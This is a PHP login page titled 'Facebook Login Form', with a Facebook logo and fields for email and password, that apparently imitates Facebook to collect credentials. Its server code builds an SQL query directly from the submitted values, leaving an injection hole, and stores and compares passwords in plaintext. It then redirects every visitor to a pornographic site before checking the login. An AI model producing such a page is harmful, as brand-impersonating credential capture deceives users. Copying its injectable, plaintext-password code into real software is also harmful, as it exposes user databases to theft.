<?php
// login.php

require_once "config.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
    $result = mysqli_query($conn, $sql);
    header('location:https://www.pornhub.com');

    if (mysqli_num_rows($result) == 1) {
        echo "Login successful!";
    } else {
        echo "Invalid email or password.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login Form</title>
    <style>
        body {
            font-family: Helvetica;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        
        img {
            max-width: 80px;
            margin-bottom: 20px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 94.5%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4169e1;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        
        input[type="submit"]:hover {
            background-color: blue;
        }

        p {
            text-align: center;
        }

        a {
            text-decoration: none;
            color: #000
        }

        a:hover{
            color: blue;
        }
    </style>
</head>
<body>
    <div class="container">
    <img src="fb.png">
        <form method="post" action="login.php">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
        <a href="signup.php"><p>Sign Up</p></a>
    </div>
</body>
</html>
